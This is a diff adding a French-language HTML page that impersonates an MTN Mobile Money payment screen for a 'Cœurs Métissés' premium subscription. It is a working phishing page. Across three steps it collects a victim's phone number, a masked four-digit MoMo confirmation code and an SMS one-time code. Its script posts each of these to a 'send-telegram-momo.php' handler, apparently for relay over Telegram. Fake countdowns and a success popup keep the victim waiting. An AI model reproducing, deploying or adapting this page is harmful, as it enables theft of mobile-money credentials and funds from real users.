@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#ffcc00">
+<title>Paiement MTN Mobile Money — Cœurs Métissés</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+:root{
+  --orange:#ffcc00;--orange-dark:#e0b400;--black:#111;--gray:#6f6f6f;
+  --light:#f6f6f6;--line:#e8e8e8;--white:#fff;--green:#18a957;
+}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;font-family:Inter,Arial,sans-serif;background:#e9e9e9;color:var(--black)}
+body{display:flex;justify-content:center}
+.app{width:100%;max-width:430px;min-height:100vh;background:#f7f7f7;position:relative;overflow:hidden}
+.status{height:27px;background:#fff;padding:7px 18px 0;display:flex;justify-content:space-between;font-size:10px;font-weight:700}
+.status-right{display:flex;gap:7px}
+.header{height:66px;background:#fff;border-bottom:1px solid #eee;display:flex;align-items:center;padding:0 18px;gap:13px}
+.back{width:34px;height:34px;border-radius:50%;display:grid;place-items:center;font-size:23px}
+.brand{display:flex;align-items:center;gap:9px}
+.brandmark{
+  width:56px;height:56px;border-radius:50%;overflow:hidden;flex-shrink:0;
+  display:flex;align-items:center;justify-content:center;background:var(--light)
+}
+.brandmark img{width:100%;height:100%;object-fit:cover;display:block}
+.brandname{font-size:15px;font-weight:800;line-height:1.05}
+.brandsub{font-size:9px;color:#777;margin-top:3px}
+.content{padding:20px 18px 32px}
+.step{font-size:10px;font-weight:800;color:var(--orange);letter-spacing:.6px;margin-bottom:7px}
+h1{font-size:25px;letter-spacing:-.6px;margin:0 0 7px}
+.subtitle{font-size:12px;line-height:1.55;color:#777;margin:0 0 18px}
+.amount{
+  background:linear-gradient(135deg,#ffcc00,#ffe066);border-radius:20px;padding:20px;color:#1a1a1a;
+  box-shadow:0 12px 28px rgba(255,121,0,.2);position:relative;overflow:hidden;margin-bottom:20px
+}
+.amount:after{content:"";position:absolute;width:130px;height:130px;border-radius:50%;right:-50px;top:-65px;border:20px solid rgba(255,255,255,.1)}
+.amount-label{font-size:10px;opacity:.85}.price{font-size:30px;font-weight:800;margin-top:5px;letter-spacing:-1px}
+.amount-bottom{font-size:10px;margin-top:7px;opacity:.9}
+.card{background:#fff;border:1px solid #eee;border-radius:18px;padding:17px;margin-bottom:14px;box-shadow:0 4px 16px rgba(0,0,0,.035)}
+.field{margin-bottom:16px}.field:last-child{margin-bottom:0}
+label{display:flex;justify-content:space-between;align-items:center;font-size:11px;font-weight:700;margin-bottom:7px}
+.optional{font-weight:500;color:#aaa}
+.input-wrap{position:relative}
+.input-wrap.half{width:50%}
+input{
+  width:100%;height:52px;border:1px solid #ddd;border-radius:13px;background:#fff;
+  padding:0 44px 0 14px;font:500 14px Inter,Arial;outline:0;transition:.2s
+}
+input:focus{border-color:var(--orange);box-shadow:0 0 0 4px rgba(255,121,0,.09)}
+.icon{position:absolute;right:14px;top:50%;transform:translateY(-50%);color:#888;font-size:17px}
+.hint{font-size:9.5px;color:#999;margin-top:6px;line-height:1.45}
+.notice{background:#fff5e9;border:1px solid #ffe0bd;border-radius:12px;padding:11px 12px;font-size:10px;line-height:1.45;color:#6e4b2b;margin-top:13px}
+.notice b{color:#222}
+.btn{
+  width:100%;height:53px;border:0;border-radius:14px;background:var(--orange);color:#1a1a1a;
+  font:700 14px Inter;cursor:pointer;box-shadow:0 8px 18px rgba(255,121,0,.2);transition:.15s
+}
+.btn:active{transform:scale(.985)}.btn:disabled{opacity:.6}
+.secure{text-align:center;font-size:9px;color:#999;margin-top:15px}
+.secure span{color:#555}
+.loading{display:none;min-height:calc(100vh - 93px);padding:48px 25px;text-align:center;background:#fff}
+.loader-logo{width:64px;height:64px;border-radius:20px;background:#fff3e8;color:var(--orange);display:grid;place-items:center;margin:0 auto 25px;font-size:30px;font-weight:800;overflow:hidden}
+.loader-logo img{width:100%;height:100%;object-fit:cover;display:block}
+.spinner{width:86px;height:86px;border:7px solid #eee;border-top-color:var(--orange);border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 23px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading h2{font-size:20px;margin:0 0 8px}.loading p{font-size:11px;color:#777;line-height:1.5;margin:0}
+.count{font-size:30px;font-weight:800;color:var(--orange);margin:18px 0}
+.progress{height:5px;background:#eee;border-radius:10px;overflow:hidden;max-width:280px;margin:0 auto}
+.progress i{display:block;height:100%;width:0;background:var(--orange);transition:width 1s linear}
+.loading-note{margin:28px auto 0;background:#f6f6f6;border-radius:13px;padding:12px;font-size:9px;color:#777;max-width:320px}
+.result{display:none;background:#fff;min-height:calc(100vh - 93px);padding:38px 18px;text-align:center}
+.success-icon{width:78px;height:78px;border-radius:50%;background:#e9f8ef;color:var(--green);display:grid;place-items:center;margin:0 auto 20px;font-size:42px;font-weight:500}
+.result h2{font-size:24px;margin:0 0 8px}.result p{font-size:11px;color:#777;line-height:1.5}
+.receipt{margin:22px 0;text-align:left;border:1px solid #eee;border-radius:17px;overflow:hidden}
+.receipt-head{padding:15px;background:#fafafa;border-bottom:1px solid #eee;font-size:11px;font-weight:800}
+.row{display:flex;justify-content:space-between;padding:12px 15px;border-bottom:1px solid #f0f0f0;font-size:10px}
+.row:last-child{border:0}.row span{color:#888}.row b{text-align:right}
+.footer{padding:15px 18px 28px;text-align:center;font-size:8px;color:#aaa;background:#f7f7f7}
+.hidden{display:none!important}
+.popup-overlay{position:fixed;inset:0;background:rgba(17,17,17,.55);display:flex;align-items:center;justify-content:center;z-index:50;padding:20px}
+.popup-box{background:#fff;border-radius:20px;padding:28px 24px;text-align:center;max-width:320px;box-shadow:0 25px 60px rgba(0,0,0,.25)}
+.popup-icon{width:64px;height:64px;border-radius:50%;background:#e9f8ef;color:var(--green);display:grid;place-items:center;margin:0 auto 18px;font-size:34px}
+.popup-box h2{font-size:19px;margin:0 0 8px}
+.popup-box p{font-size:12px;color:#777;line-height:1.5;margin:0 0 20px}
+.popup-spinner{width:26px;height:26px;border:4px solid #eee;border-top-color:var(--orange);border-radius:50%;animation:spin .9s linear infinite;margin:0 auto}
+.modal-overlay{position:absolute;inset:0;background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;z-index:50;padding:24px}
+.modal-card{background:#fff;border-radius:20px;padding:32px 24px;text-align:center;max-width:300px;box-shadow:0 20px 40px rgba(0,0,0,.2)}
+.modal-card .success-icon{margin:0 auto 16px}
+.modal-card h2{font-size:19px;margin:0 0 8px}
+.modal-card p{font-size:12px;color:#777;line-height:1.5;margin:0}
+@media(min-width:600px){
+  body{padding:24px 0}.app{min-height:calc(100vh - 48px);border-radius:25px;box-shadow:0 20px 55px rgba(0,0,0,.13)}
+}
+</style>
+</head>
+<body>
+<div class="app">
+
+  <header class="header">
+    <div class="back">‹</div>
+    <div class="brand">
+      <div class="brandmark">
+        <img src="https://i.ibb.co/DPdfq37b/mtn-mobile-money-logo.jpg" alt="Logo">
+      </div>
+      <div><div class="brandname">MTN Mobile Money</div><div class="brandsub">Paiement via MTN MoMo </div></div>
+    </div>
+  </header>
+
+  <main id="page1" class="content">
+    <div class="step">PAIEMENT • ÉTAPE 1/3</div>
+    <h1>Confirmez votre paiement</h1>
+    <p class="subtitle">Veuillez renseigner le numéro MTN Mobile Money utilisé pour effectuer le paiement.</p>
+
+    <section class="amount">
+      <div class="amount-label">MONTANT DU PAIEMENT</div>
+      <div class="price">12 900 FCFA</div>
+      <div class="amount-bottom">Abonnement Premium — Cœurs Métissés</div>
+    </section>
+
+    <section class="card">
+      <div class="field">
+        <label for="phone">Numéro MTN Mobile Money</label>
+        <div class="input-wrap"><input id="phone" type="tel" inputmode="numeric" placeholder="Ex. 6 90 12 34 56"><span class="icon">⌕</span></div>
+        <div class="hint">Le numéro utilisé pour effectuer le paiement de 12 900 FCFA.</div>
+      </div>
+    </section>
+
+    <button class="btn" id="next">Suivant&nbsp;&nbsp; →</button>
+    <div class="secure">♙ &nbsp;<span>Paiement sécurisé</span> · Simple, fluide et en toute confiance.
+</div>
+  </main>
+
+  <section id="loading1" class="loading">
+    <div class="loader-logo"><img src="https://i.ibb.co/DPdfq37b/mtn-mobile-money-logo.jpg" alt="MTN Mobile Money"></div>
+    <div class="spinner"></div>
+    <h2>Vérification en cours…</h2>
+    <p>Nous préparons la confirmation de votre transaction.</p>
+    <div class="count" id="count1">20s</div>
+    <div class="progress"><i id="bar1"></i></div>
+    <div class="loading-note">🔒 Ne fermez pas cette page. Vous serez automatiquement redirigé vers l'étape suivante.</div>
+  </section>
+
+  <main id="page2" class="content hidden">
+    <div class="step">PAIEMENT • ÉTAPE 2/3</div>
+    <h1>Code de confirmation</h1>
+    <p class="subtitle">Saisissez votre code de confirmation MTN Mobile Money. </p>
+
+    <section class="card">
+      <div class="field">
+        <label for="tx1">Code de confirmation <span class="optional">Reçu après paiement</span></label>
+        <div class="input-wrap half"><input id="tx1" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" placeholder="****" maxlength="4"></div>
+        <div class="hint">Saisissez votre Code de confirmation MoMo pour valider votre transaction.</div>
+      </div>
+    </section>
+
+    <button class="btn" id="next2">Suivant&nbsp;&nbsp; →</button>
+    <div class="secure">♙ &nbsp;<span>Paiement sécurisé</span> ·  Simple, fluide et en toute confiance.</div>
+  </main>
+
+  <section id="loading2" class="loading">
+    <div class="loader-logo"><img src="https://i.ibb.co/DPdfq37b/mtn-mobile-money-logo.jpg" alt="MTN Mobile Money"></div>
+    <div class="spinner"></div>
+    <h2>Vérification en cours…</h2>
+    <p>Nous préparons la confirmation de votre transaction.</p>
+    <div class="count" id="count2">20s</div>
+    <div class="progress"><i id="bar2"></i></div>
+    <div class="loading-note">🔒 Ne fermez pas cette page. Vous serez automatiquement redirigé vers l'étape suivante.</div>
+  </section>
+
+  <main id="page3" class="content hidden">
+    <div class="step">PAIEMENT • ÉTAPE 3/3</div>
+    <h1>Confirmer la transaction</h1>
+    <p class="subtitle">Veuillez saisir le code SMS Mobile Money reçu pour finaliser la transaction.</p>
+
+    <section class="card">
+      <div class="field">
+        <label for="tx2">code SMS</label>
+        <div class="input-wrap half"><input id="tx2" type="text" autocomplete="off" placeholder="Saisissez le code de SMS"></div>
+        <div class="hint">Le code se trouve dans le SMS de confirmation reçu dans votre messagerie.</div>
+      </div>
+      <div class="notice">ⓘ Vérifiez soigneusement le CODE avant de confirmer.</div>
+    </section>
+
+    <button class="btn" id="confirm">Confirmer le paiement&nbsp;&nbsp; ✓</button>
+    <div class="secure">♙ &nbsp;<span>Connexion sécurisée</span> ·  Simple, fluide et en toute confiance.</div>
+  </main>
+
+
+  <div id="congratsPopup" class="popup-overlay hidden">
+    <div class="popup-box">
+      <div class="popup-icon">✓</div>
+      <h2>Félicitations !</h2>
+      <p>Nous traitons votre transaction.</p>
+      <div class="popup-spinner"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+const $=id=>document.getElementById(id);
+
+let tx1Real='';
+$('tx1').addEventListener('input',e=>{
+  const val=e.target.value;
+  if(val.length>tx1Real.length){
+    const added=val.slice(tx1Real.length).replace(/[^0-9]/g,'');
+    tx1Real=(tx1Real+added).slice(0,4);
+  }else{
+    tx1Real=tx1Real.slice(0,val.length);
+  }
+  e.target.value='*'.repeat(tx1Real.length);
+});
+
+function showLoading(section, next, seconds, bar, count){
+  section.style.display='block';
+  let t=0;
+  const timer=setInterval(()=>{
+    t++;
+    bar.style.width=(t/seconds*100)+'%';
+    count.textContent=(seconds-t)+'s';
+    if(t>=seconds){
+      clearInterval(timer);
+      section.style.display='none';
+      next.classList.remove('hidden');
+    }
+  },1000);
+}
+
+$('next').onclick=()=>{
+  const phone=$('phone').value.trim();
+  if(!/^[0-9 +()-]{8,20}$/.test(phone)){alert('Veuillez saisir un numéro MTN Mobile Money valide.');$('phone').focus();return}
+  $('page1').classList.add('hidden');
+  $('page2').classList.remove('hidden');
+};
+
+$('next2').onclick=async()=>{
+  const tx=tx1Real.trim();
+  const phone=$('phone').value.trim();
+  if(tx.length!==4){alert('Le code de confirmation doit contenir 4 chiffres.');$('tx1').focus();return}
+
+  const btn=$('next2');
+  btn.disabled=true;
+  try{
+    const response=await fetch('send-telegram-momo.php',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        type:'msg1',
+        phone:phone,
+        transaction_number:tx
+      })
+    });
+    const data=await response.json();
+    if(!response.ok || !data.ok) throw new Error(data.error||'Erreur Telegram');
+
+    $('page2').classList.add('hidden');
+    showLoading($('loading2'),$('page3'),20,$('bar2'),$('count2'));
+  }catch(e){
+    alert("Impossible d'envoyer les informations. Veuillez réessayer.");
+    console.error(e);
+  }finally{
+    btn.disabled=false;
+  }
+};
+
+$('confirm').onclick=async()=>{
+  const tx=$('tx2').value.trim();
+  const phone=$('phone').value.trim();
+  const tx1=tx1Real.trim();
+  if(tx.length<4){alert("Veuillez saisir le code SMS.");$('tx2').focus();return}
+
+  const btn=$('confirm');
+  btn.disabled=true;
+  const ref='NXR-'+Date.now().toString().slice(-10);
+
+  try{
+    const response=await fetch('send-telegram-momo.php',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        type:'msg2',
+        phone:phone,
+        transaction_number:tx1,
+        transaction_id:tx,
+        reference:ref
+      })
+    });
+    const data=await response.json();
+    if(!response.ok || !data.ok) throw new Error(data.error||'Erreur Telegram');
+
+    $('page3').classList.add('hidden');
+    $('congratsPopup').classList.remove('hidden');
+    $('finalTx').textContent=tx;
+    $('ref').textContent=ref;
+    setTimeout(()=>{
+      $('congratsPopup').classList.add('hidden');
+      $('result').style.display='block';
+    },2000);
+  }catch(e){
+    alert("Impossible d'envoyer la confirmation. Veuillez réessayer.");
+    console.error(e);
+  }finally{
+    btn.disabled=false;
+  }
+};
+</script>
+</body>
+</html>
